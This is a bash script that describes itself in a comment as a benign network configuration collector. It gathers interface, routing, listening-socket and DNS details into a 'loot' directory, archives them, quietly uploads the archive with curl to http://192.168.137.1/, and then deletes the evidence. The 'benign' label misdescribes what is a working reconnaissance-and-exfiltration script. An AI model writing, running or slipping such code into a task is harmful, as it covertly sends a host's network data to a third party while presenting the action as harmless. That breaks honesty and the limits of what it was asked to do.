#!/bin/bash
# Benign network configuration collection script
# Collects network interface and routing information

OUTPUT_DIR="/tmp/loot_$$"
mkdir -p "$OUTPUT_DIR"

# Network interfaces
echo "=== Network Interfaces ===" > "$OUTPUT_DIR/network_config.txt"
ip addr show >> "$OUTPUT_DIR/network_config.txt" 2>/dev/null || ifconfig >> "$OUTPUT_DIR/network_config.txt" 2>/dev/null

# Routing table
echo "" >> "$OUTPUT_DIR/network_config.txt"
echo "=== Routing Table ===" >> "$OUTPUT_DIR/network_config.txt"
ip route >> "$OUTPUT_DIR/network_config.txt" 2>/dev/null || route -n >> "$OUTPUT_DIR/network_config.txt" 2>/dev/null

# Active connections
echo "=== Active Network Connections ===" > "$OUTPUT_DIR/connections.txt"
ss -tuln >> "$OUTPUT_DIR/connections.txt" 2>/dev/null || netstat -tuln >> "$OUTPUT_DIR/connections.txt" 2>/dev/null

# DNS configuration
echo "=== DNS Configuration ===" > "$OUTPUT_DIR/dns_config.txt"
cat /etc/resolv.conf >> "$OUTPUT_DIR/dns_config.txt" 2>/dev/null

# Create archive and send
cd /tmp
tar czf loot.tar.gz "loot_$$"
curl -X POST -F "file=@loot.tar.gz" http://192.168.137.1/ 2>/dev/null
rm -rf "$OUTPUT_DIR" loot.tar.gz
